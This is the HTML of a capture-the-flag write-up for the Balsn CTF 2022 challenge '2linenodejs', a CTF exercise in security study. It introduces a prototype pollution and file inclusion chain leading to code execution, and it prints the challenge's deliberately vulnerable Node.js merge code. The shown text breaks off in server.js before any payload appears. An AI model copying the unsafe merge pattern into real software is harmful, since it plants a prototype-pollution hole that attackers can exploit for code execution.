<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><meta data-react-helmet="true" name="twitter:description" content="Utilizing powerful prototype pollution gadgets to achieve remote code execution in a very small nodejs application"/><meta data-react-helmet="true" name="twitter:title" content="Balsn CTF 2022 - 2linenodejs"/><meta data-react-helmet="true" name="twitter:creator" content="_downgrade"/><meta data-react-helmet="true" name="twitter:card" content="summary"/><meta data-react-helmet="true" property="og:type" content="website"/><meta data-react-helmet="true" property="og:description" content="Utilizing powerful prototype pollution gadgets to achieve remote code execution in a very small nodejs application"/><meta data-react-helmet="true" property="og:title" content="Balsn CTF 2022 - 2linenodejs"/><meta data-react-helmet="true" name="description" content="Utilizing powerful prototype pollution gadgets to achieve remote code execution in a very small nodejs application"/><meta name="generator" content="Gatsby 4.17.2"/><style data-href="/styles.aa9ab521a635e0fdc4bb.css" data-identity="gatsby-global-css">@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:100;src:local("Montserrat Thin "),local("Montserrat-Thin"),url(/static/montserrat-latin-100-8d7d79679b70dbe27172b6460e7a7910.woff2) format("woff2"),url(/static/montserrat-latin-100-ec38980a9e0119a379e2a9b3dbb1901a.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:100;src:local("Montserrat Thin italic"),local("Montserrat-Thinitalic"),url(/static/montserrat-latin-100italic-e279051046ba1286706adc886cf1c96b.woff2) format("woff2"),url(/static/montserrat-latin-100italic-3b325a3173c8207435cd1b76e19bf501.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:200;src:local("Montserrat Extra Light "),local("Montserrat-Extra Light"),url(/static/montserrat-latin-200-9d266fbbfa6cab7009bd56003b1eeb67.woff2) format("woff2"),url(/static/montserrat-latin-200-2d8ba08717110d27122e54c34b8a5798.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:200;src:local("Montserrat Extra Light italic"),local("Montserrat-Extra Lightitalic"),url(/static/montserrat-latin-200italic-6e5b3756583bb2263eb062eae992735e.woff2) format("woff2"),url(/static/montserrat-latin-200italic-a0d6f343e4b536c582926255367a57da.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:300;src:local("Montserrat Light "),local("Montserrat-Light"),url(/static/montserrat-latin-300-00b3e893aab5a8fd632d6342eb72551a.woff2) format("woff2"),url(/static/montserrat-latin-300-ea303695ceab35f17e7d062f30e0173b.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:300;src:local("Montserrat Light italic"),local("Montserrat-Lightitalic"),url(/static/montserrat-latin-300italic-56f34ea368f6aedf89583d444bbcb227.woff2) format("woff2"),url(/static/montserrat-latin-300italic-54b0bf2c8c4c12ffafd803be2466a790.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:400;src:local("Montserrat Regular "),local("Montserrat-Regular"),url(/static/montserrat-latin-400-b71748ae4f80ec8c014def4c5fa8688b.woff2) format("woff2"),url(/static/montserrat-latin-400-0659a9f4e90db5cf51b50d005bff1e41.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:400;src:local("Montserrat Regular italic"),local("Montserrat-Regularitalic"),url(/static/montserrat-latin-400italic-6eed6b4cbb809c6efc7aa7ddad6dbe3e.woff2) format("woff2"),url(/static/montserrat-latin-400italic-7583622cfde30ae49086d18447ab28e7.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:500;src:local("Montserrat Medium "),local("Montserrat-Medium"),url(/static/montserrat-latin-500-091b209546e16313fd4f4fc36090c757.woff2) format("woff2"),url(/static/montserrat-latin-500-edd311588712a96bbf435fad264fff62.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:500;src:local("Montserrat Medium italic"),local("Montserrat-Mediumitalic"),url(/static/montserrat-latin-500italic-c90ced68b46050061d1a41842d6dfb43.woff2) format("woff2"),url(/static/montserrat-latin-500italic-5146cbfe02b1deea5dffea27a5f2f998.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:600;src:local("Montserrat SemiBold "),local("Montserrat-SemiBold"),url(/static/montserrat-latin-600-0480d2f8a71f38db8633b84d8722e0c2.woff2) format("woff2"),url(/static/montserrat-latin-600-b77863a375260a05dd13f86a1cee598f.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:600;src:local("Montserrat SemiBold italic"),local("Montserrat-SemiBolditalic"),url(/static/montserrat-latin-600italic-cf46ffb11f3a60d7df0567f8851a1d00.woff2) format("woff2"),url(/static/montserrat-latin-600italic-c4fcfeeb057724724097167e57bd7801.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:700;src:local("Montserrat Bold "),local("Montserrat-Bold"),url(/static/montserrat-latin-700-7dbcc8a5ea2289d83f657c25b4be6193.woff2) format("woff2"),url(/static/montserrat-latin-700-99271a835e1cae8c76ef8bba99a8cc4e.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:700;src:local("Montserrat Bold italic"),local("Montserrat-Bolditalic"),url(/static/montserrat-latin-700italic-c41ad6bdb4bd504a843d546d0a47958d.woff2) format("woff2"),url(/static/montserrat-latin-700italic-6779372f04095051c62ed36bc1dcc142.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:800;src:local("Montserrat ExtraBold "),local("Montserrat-ExtraBold"),url(/static/montserrat-latin-800-db9a3e0ba7eaea32e5f55328ace6cf23.woff2) format("woff2"),url(/static/montserrat-latin-800-4e3c615967a2360f5db87d2f0fd2456f.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:800;src:local("Montserrat ExtraBold italic"),local("Montserrat-ExtraBolditalic"),url(/static/montserrat-latin-800italic-bf45bfa14805969eda318973947bc42b.woff2) format("woff2"),url(/static/montserrat-latin-800italic-fe82abb0bcede51bf724254878e0c374.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:900;src:local("Montserrat Black "),local("Montserrat-Black"),url(/static/montserrat-latin-900-e66c7edc609e24bacbb705175669d814.woff2) format("woff2"),url(/static/montserrat-latin-900-8211f418baeb8ec880b80ba3c682f957.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:900;src:local("Montserrat Black italic"),local("Montserrat-Blackitalic"),url(/static/montserrat-latin-900italic-4454c775e48152c1a72510ceed3603e2.woff2) format("woff2"),url(/static/montserrat-latin-900italic-efcaa0f6a82ee0640b83a0916e6e8d68.woff) format("woff")}@font-face{font-display:swap;font-family:Merriweather;font-style:normal;font-weight:300;src:local("Merriweather Light "),local("Merriweather-Light"),url(/static/merriweather-latin-300-fc117160c69a8ea0851b26dd14748ee4.woff2) format("woff2"),url(/static/merriweather-latin-300-58b18067ebbd21fda77b67e73c241d3b.woff) format("woff")}@font-face{font-display:swap;font-family:Merriweather;font-style:italic;font-weight:300;src:local("Merriweather Light italic"),local("Merriweather-Lightitalic"),url(/static/merriweather-latin-300italic-fe29961474f8dbf77c0aa7b9a629e4bc.woff2) format("woff2"),url(/static/merriweather-latin-300italic-23c3f1f88683618a4fb8d265d33d383a.woff) format("woff")}@font-face{font-display:swap;font-family:Merriweather;font-style:normal;font-weight:400;src:local("Merriweather Regular "),local("Merriweather-Regular"),url(/static/merriweather-latin-400-d9479e8023bef9cbd9bf8d6eabd6bf36.woff2) format("woff2"),url(/static/merriweather-latin-400-040426f99ff6e00b86506452e0d1f10b.woff) format("woff")}@font-face{font-display:swap;font-family:Merriweather;font-style:italic;font-weight:400;src:local("Merriweather Regular italic"),local("Merriweather-Regularitalic"),url(/static/merriweather-latin-400italic-2de7bfeaf08fb03d4315d49947f062f7.woff2) format("woff2"),url(/static/merriweather-latin-400italic-79db67aca65f5285964ab332bd65f451.woff) format("woff")}@font-face{font-display:swap;font-family:Merriweather;font-style:normal;font-weight:700;src:local("Merriweather Bold "),local("Merriweather-Bold"),url(/static/merriweather-latin-700-4b08e01d805fa35d7bf777f1b24314ae.woff2) format("woff2"),url(/static/merriweather-latin-700-22fb8afba4ab1f093b6ef9e28a9b6e92.woff) format("woff")}@font-face{font-display:swap;font-family:Merriweather;font-style:italic;font-weight:700;src:local("Merriweather Bold italic"),local("Merriweather-Bolditalic"),url(/static/merriweather-latin-700italic-cd92541b177652fffb6e3b952f1c33f1.woff2) format("woff2"),url(/static/merriweather-latin-700italic-f87f3d87cea0dd0979bfc8ac9ea90243.woff) format("woff")}@font-face{font-display:swap;font-family:Merriweather;font-style:normal;font-weight:900;src:local("Merriweather Black "),local("Merriweather-Black"),url(/static/merriweather-latin-900-f813fc6a4bee46eda5224ac7ebf1b7be.woff2) format("woff2"),url(/static/merriweather-latin-900-5d4e42cb44410674acd99153d57df032.woff) format("woff")}@font-face{font-display:swap;font-family:Merriweather;font-style:italic;font-weight:900;src:local("Merriweather Black italic"),local("Merriweather-Blackitalic"),url(/static/merriweather-latin-900italic-b7901d85486871c1779c0e93ddd85656.woff2) format("woff2"),url(/static/merriweather-latin-900italic-9647f9fdab98756989a8a5550eb205c3.woff) format("woff")}


/*! normalize.css v8.0.1 | MIT License | github.com/necolas/normalize.css */html{-webkit-text-size-adjust:100%;line-height:1.15}body{margin:0}main{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;-webkit-text-decoration:underline dotted;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}[type=button],[type=reset],[type=submit],button{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:.35em .75em .625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type=checkbox],[type=radio]{box-sizing:border-box;padding:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}[hidden]{display:none}:root{--maxWidth-none:"none";--maxWidth-xs:20rem;--maxWidth-sm:24rem;--maxWidth-md:28rem;--maxWidth-lg:32rem;--maxWidth-xl:36rem;--maxWidth-2xl:42rem;--maxWidth-3xl:48rem;--maxWidth-4xl:56rem;--maxWidth-5xl:68rem;--maxWidth-full:"100%";--maxWidth-wrapper:var(--maxWidth-5xl);--spacing-px:"1px";--spacing-0:0;--spacing-1:0.25rem;--spacing-2:0.5rem;--spacing-3:0.75rem;--spacing-4:1rem;--spacing-5:1.25rem;--spacing-6:1.5rem;--spacing-8:2rem;--spacing-10:2.5rem;--spacing-12:3rem;--spacing-16:4rem;--spacing-20:5rem;--spacing-24:6rem;--spacing-32:8rem;--fontFamily-sans:Montserrat,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";--fontFamily-serif:"Merriweather","Georgia",Cambria,"Times New Roman",Times,serif;--font-body:var(--fontFamily-serif);--font-heading:var(--fontFamily-sans);--fontWeight-normal:400;--fontWeight-medium:500;--fontWeight-semibold:600;--fontWeight-bold:700;--fontWeight-extrabold:800;--fontWeight-black:900;--fontSize-root:16px;--lineHeight-none:1;--lineHeight-tight:1.1;--lineHeight-normal:1.5;--lineHeight-relaxed:1.625;--fontSize-0:0.833rem;--fontSize-1:1rem;--fontSize-2:1.2rem;--fontSize-3:1.44rem;--fontSize-4:1.728rem;--fontSize-5:2.074rem;--fontSize-6:2.488rem;--fontSize-7:2.986rem;--color-primary:#8ebfe1;--color-text:#f1f1f1;--color-text-light:#4f5969;--color-heading:#e5f0ff;--color-heading-black:#fbfbfb;--color-accent:#d1dce5}*,:after,:before{box-sizing:border-box}html{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;background-color:#101010;font-size:var(--fontSize-root);line-height:var(--lineHeight-normal)}body{color:var(--color-text);font-family:var(--font-body);font-size:var(--fontSize-1)}footer{padding:var(--spacing-6) var(--spacing-0)}hr{background:var(--color-accent);border:0;height:1px}h1,h2,h3,h4,h5,h6{font-family:var(--font-heading);letter-spacing:-.025em;line-height:var(--lineHeight-tight);margin-bottom:var(--spacing-6);margin-top:var(--spacing-12)}h2,h3,h4,h5,h6{font-weight:var(--fontWeight-bold)}h1,h2,h3,h4,h5,h6{color:var(--color-heading)}h1{font-size:var(--fontSize-6);font-weight:var(--fontWeight-black)}h2{font-size:var(--fontSize-5)}h3{font-size:var(--fontSize-4)}h4{font-size:var(--fontSize-3)}h5{font-size:var(--fontSize-2)}h6{font-size:var(--fontSize-1)}h1>a,h2>a,h3>a,h4>a,h5>a,h6>a{color:inherit;text-decoration:none}p{--baseline-multiplier:0.179;--x-height-multiplier:0.35;line-height:var(--lineHeight-relaxed);margin:var(--spacing-0) var(--spacing-0) var(--spacing-8) var(--spacing-0)}ol,p,ul{padding:var(--spacing-0)}ol,ul{list-style-image:none;list-style-position:outside;margin-bottom:var(--spacing-8);margin-left:var(--spacing-0);margin-right:var(--spacing-0)}ol li,ul li{padding-left:var(--spacing-0)}li>p,ol li,ul li{margin-bottom:calc(var(--spacing-8)/2)}li :last-child{margin-bottom:var(--spacing-0)}li>ul{margin-left:var(--spacing-8);margin-top:calc(var(--spacing-8)/2)}blockquote{border-left:var(--spacing-1) solid var(--color-primary);color:var(--color-text);font-size:var(--fontSize-2);font-style:italic;margin-bottom:var(--spacing-8);margin-left:calc(var(--spacing-6)*-1);margin-right:var(--spacing-8);padding:var(--spacing-0) var(--spacing-0) var(--spacing-0) var(--spacing-6)}blockquote>:last-child{margin-bottom:var(--spacing-0)}blockquote>ol,blockquote>ul{list-style-position:inside}table{border-collapse:collapse;border-spacing:.25rem;margin-bottom:var(--spacing-8);width:100%}table thead tr th{border-bottom:1px solid var(--color-accent)}a{color:var(--color-primary)}a:focus,a:hover{text-decoration:none}.navBarLink{margin:5px}.global-wrapper{margin:var(--spacing-0) auto;max-width:var(--maxWidth-wrapper);padding:var(--spacing-10) var(--spacing-5)}.global-wrapper[data-is-root-path=true] .bio{margin-bottom:var(--spacing-20)}.global-header{margin-bottom:var(--spacing-12)}.main-heading{font-size:var(--fontSize-7);margin:0}.post-list-item{margin-bottom:var(--spacing-8);margin-top:var(--spacing-8)}.post-list-item p{margin-bottom:var(--spacing-0)}.post-list-item h2{color:var(--color-primary);font-size:var(--fontSize-4);margin-bottom:var(--spacing-2);margin-top:var(--spacing-0)}.post-list-item header{margin-bottom:var(--spacing-4)}.header-link-home{font-family:var(--font-heading);font-size:var(--fontSize-2);font-weight:var(--fontWeight-bold);text-decoration:none}.bio{display:flex;margin-bottom:var(--spacing-16)}.bio p,.bio-avatar{margin-bottom:var(--spacing-0)}.bio-avatar{border-radius:100%;margin-right:var(--spacing-4);min-width:50px}.blog-post header h1{margin:var(--spacing-0) var(--spacing-0) var(--spacing-4) var(--spacing-0)}.blog-post header p{font-family:var(--font-heading);font-size:var(--fontSize-2)}.blog-post-nav ul{margin:var(--spacing-0)}.gatsby-highlight{margin-bottom:var(--spacing-8)}@media (max-width:42rem){blockquote{margin-left:var(--spacing-0);padding:var(--spacing-0) var(--spacing-0) var(--spacing-0) var(--spacing-4)}ol,ul{list-style-position:inside}}code[class*=language-],pre[class*=language-]{word-wrap:normal;background:0 0;color:#fff;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:1em;-webkit-hyphens:none;hyphens:none;line-height:1.5;-o-tab-size:4;tab-size:4;text-align:left;text-shadow:0 -.1em .2em #000;white-space:pre;word-break:normal;word-spacing:normal}:not(pre)>code[class*=language-],pre[class*=language-]{background:#141414}pre[class*=language-]{border:.3em solid #545454;border-radius:.5em;box-shadow:inset 1px 1px .5em #000;margin:.5em 0;overflow:auto;padding:1em}pre[class*=language-]::selection{background:#27292a}code[class*=language-] ::selection,code[class*=language-]::selection,pre[class*=language-] ::selection,pre[class*=language-]::selection{background:hsla(0,0%,93%,.15);text-shadow:none}:not(pre)>code[class*=language-]{border:.13em solid #545454;border-radius:.3em;box-shadow:inset 1px 1px .3em -.1em #000;padding:.15em .2em .05em;white-space:normal}.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#777}.token.namespace,.token.punctuation{opacity:.7}.token.boolean,.token.deleted,.token.number,.token.tag{color:#ce6849}.token.builtin,.token.constant,.token.keyword,.token.property,.token.selector,.token.symbol{color:#f9ed99}.language-css .token.string,.style .token.string,.token.attr-name,.token.attr-value,.token.char,.token.entity,.token.inserted,.token.operator,.token.string,.token.url,.token.variable{color:#909e6a}.token.atrule{color:#7385a5}.token.important,.token.regex{color:#e8c062}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}.language-markup .token.attr-name,.language-markup .token.punctuation,.language-markup .token.tag{color:#ac885c}.token{position:relative;z-index:1}.line-highlight.line-highlight{background:hsla(0,0%,33%,.25);background:linear-gradient(90deg,hsla(0,0%,33%,.1) 70%,hsla(0,0%,33%,0));border-bottom:1px dashed #545454;border-top:1px dashed #545454;margin-top:.75em;z-index:0}.line-highlight.line-highlight:before,.line-highlight.line-highlight[data-end]:after{background-color:#8693a6;color:#f4f1ef}</style><style>.gatsby-image-wrapper{position:relative;overflow:hidden}.gatsby-image-wrapper picture.object-fit-polyfill{position:static!important}.gatsby-image-wrapper img{bottom:0;height:100%;left:0;margin:0;max-width:none;padding:0;position:absolute;right:0;top:0;width:100%;object-fit:cover}.gatsby-image-wrapper [data-main-image]{opacity:0;transform:translateZ(0);transition:opacity .25s linear;will-change:opacity}.gatsby-image-wrapper-constrained{display:inline-block;vertical-align:top}</style><noscript><style>.gatsby-image-wrapper noscript [data-main-image]{opacity:1!important}.gatsby-image-wrapper [data-placeholder-image]{opacity:0!important}</style></noscript><script type="module">const e="undefined"!=typeof HTMLImageElement&&"loading"in HTMLImageElement.prototype;e&&document.body.addEventListener("load",(function(e){const t=e.target;if(void 0===t.dataset.mainImage)return;if(void 0===t.dataset.gatsbyImageSsr)return;let a=null,n=t;for(;null===a&&n;)void 0!==n.parentNode.dataset.gatsbyImageWrapper&&(a=n.parentNode),n=n.parentNode;const o=a.querySelector("[data-placeholder-image]"),r=new Image;r.src=t.currentSrc,r.decode().catch((()=>{})).then((()=>{t.style.opacity=1,o&&(o.style.opacity=0,o.style.transition="opacity 500ms linear")}))}),!0);</script><style type="text/css">
    .anchor.before {
      position: absolute;
      top: 0;
      left: 0;
      transform: translateX(-100%);
      padding-right: 4px;
    }
    .anchor.after {
      display: inline-block;
      padding-left: 4px;
    }
    h1 .anchor svg,
    h2 .anchor svg,
    h3 .anchor svg,
    h4 .anchor svg,
    h5 .anchor svg,
    h6 .anchor svg {
      visibility: hidden;
    }
    h1:hover .anchor svg,
    h2:hover .anchor svg,
    h3:hover .anchor svg,
    h4:hover .anchor svg,
    h5:hover .anchor svg,
    h6:hover .anchor svg,
    h1 .anchor:focus svg,
    h2 .anchor:focus svg,
    h3 .anchor:focus svg,
    h4 .anchor:focus svg,
    h5 .anchor:focus svg,
    h6 .anchor:focus svg {
      visibility: visible;
    }
  </style><script>
    document.addEventListener("DOMContentLoaded", function(event) {
      var hash = window.decodeURI(location.hash.replace('#', ''))
      if (hash !== '') {
        var element = document.getElementById(hash)
        if (element) {
          var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop
          var clientTop = document.documentElement.clientTop || document.body.clientTop || 0
          var offset = element.getBoundingClientRect().top + scrollTop - clientTop
          // Wait for the browser to finish rendering before scrolling.
          setTimeout((function() {
            window.scrollTo(0, offset - 0)
          }), 0)
        }
      }
    })
  </script><link rel="alternate" type="application/rss+xml" title="Gatsby Starter Blog RSS Feed" href="/rss.xml"/><link rel="icon" href="/favicon-32x32.png?v=f03feb8860d037d783663ff293cd1e6c" type="image/png"/><link rel="manifest" href="/manifest.webmanifest" crossorigin="anonymous"/><link rel="apple-touch-icon" sizes="48x48" href="/icons/icon-48x48.png?v=f03feb8860d037d783663ff293cd1e6c"/><link rel="apple-touch-icon" sizes="72x72" href="/icons/icon-72x72.png?v=f03feb8860d037d783663ff293cd1e6c"/><link rel="apple-touch-icon" sizes="96x96" href="/icons/icon-96x96.png?v=f03feb8860d037d783663ff293cd1e6c"/><link rel="apple-touch-icon" sizes="144x144" href="/icons/icon-144x144.png?v=f03feb8860d037d783663ff293cd1e6c"/><link rel="apple-touch-icon" sizes="192x192" href="/icons/icon-192x192.png?v=f03feb8860d037d783663ff293cd1e6c"/><link rel="apple-touch-icon" sizes="256x256" href="/icons/icon-256x256.png?v=f03feb8860d037d783663ff293cd1e6c"/><link rel="apple-touch-icon" sizes="384x384" href="/icons/icon-384x384.png?v=f03feb8860d037d783663ff293cd1e6c"/><link rel="apple-touch-icon" sizes="512x512" href="/icons/icon-512x512.png?v=f03feb8860d037d783663ff293cd1e6c"/><title data-react-helmet="true">Balsn CTF 2022 - 2linenodejs | downgrade</title></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><div class="global-wrapper" data-is-root-path="false"><header class="global-header"><nav><div classname="navbar"><a class="navBarLink" href="/">Home</a><a class="navBarLink" href="/about">About</a></div></nav></header><main><article class="blog-post" itemscope="" itemType="http://schema.org/Article"><header><h1 itemProp="headline">Balsn CTF 2022 - 2linenodejs</h1><p>September 04, 2022</p></header><section itemProp="articleBody"><p>BalsnCTF 2022 took place over the weekend and featured an awesome web challenge titled “2linenodejs”, which I solved with some teammates. Our solution uses a pretty cool exploit chain of prototype pollution &#x26; local file inclusion. Prototype pollution is an incredibly fun vulnerability, and this challenge really opened my eyes to the possibilities of what can be achieved.</p>
<hr>
<h2 id="challenge-description" style="position:relative;"><a href="#challenge-description" aria-label="challenge description permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Challenge Description</h2>
<blockquote>
<p>Sorry for my bad coding style :(</p>
<p><a href="http://2linenodejs.balsnctf.com/">http://2linenodejs.balsnctf.com</a></p>
<p><a href="https://balsnctf-challenges-2022.s3.amazonaws.com/2linenodejs/bf99ab1cdb5b25773ae75db832244764.zip">dist.zip</a></p>
<p>Author: ginoah</p>
</blockquote>
<h1 id="overview" style="position:relative;"><a href="#overview" aria-label="overview permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Overview</h1>
<p>The vulnerable application is a simple JSON parser which takes a user supplied JSON object and parses it before displaying to the user.</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 586px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/9323777a790d70ec4e47b6ed72c8d5f9/a76f4/sample.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 15.18987341772152%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAlElEQVQI143C6wqCMBgAUJ8kMC9dTCtsrqC0/Qh8vBQ3981t+JCNhKlFb9DhOAUps/MdX8g1fxSkRLhAOD9leYpuq226Do9+sF/6iRceohhHcbbZIS9IXD9euJFDGTSUg9Atl1L1lImGgug0CF3VrHo2Vc04KBBaqr6Tv1yoFlTLpWPMy452nmdr7TSNw/A2xnz+8wXwFWrbVh0U2gAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="application showing parsed object"
        title="application showing parsed object"
        src="/static/9323777a790d70ec4e47b6ed72c8d5f9/a76f4/sample.png"
        srcset="/static/9323777a790d70ec4e47b6ed72c8d5f9/c26ae/sample.png 158w,
/static/9323777a790d70ec4e47b6ed72c8d5f9/6bdcf/sample.png 315w,
/static/9323777a790d70ec4e47b6ed72c8d5f9/a76f4/sample.png 586w"
        sizes="(max-width: 586px) 100vw, 586px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
  </a>
    </span></p>
<p>The entirety of the application’s source code is contained within the following three small files:</p>
<div class="gatsby-highlight" data-language="js"><pre class="language-js"><code class="language-js"><span class="token comment">//index.js</span>
module<span class="token punctuation">.</span><span class="token function-variable function">exports</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token parameter"><span class="token constant">O</span><span class="token punctuation">,</span>o</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span><span class="token constant">O</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">[</span><span class="token constant">K</span><span class="token punctuation">,</span><span class="token constant">V</span><span class="token punctuation">]</span></span><span class="token punctuation">)</span><span class="token operator">=></span>Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span><span class="token constant">V</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">[</span>k<span class="token punctuation">,</span>v<span class="token punctuation">]</span></span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">(</span>o<span class="token punctuation">[</span><span class="token constant">K</span><span class="token punctuation">]</span><span class="token operator">=</span>o<span class="token punctuation">[</span><span class="token constant">K</span><span class="token punctuation">]</span><span class="token operator">||</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>o<span class="token punctuation">[</span><span class="token constant">K</span><span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">=</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> o<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
<div class="gatsby-highlight" data-language="js"><pre class="language-js"><code class="language-js"><span class="token comment">//server.js</span>
#<span class="token operator">!</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>bin<span class="token operator">/</span>node
process<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span><span class="token function">setEncoding</span><span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
process<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'readable'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">try</span><span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'HTTP/1.1 200 OK\nContent-Type: text/html\nConnection: Close\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
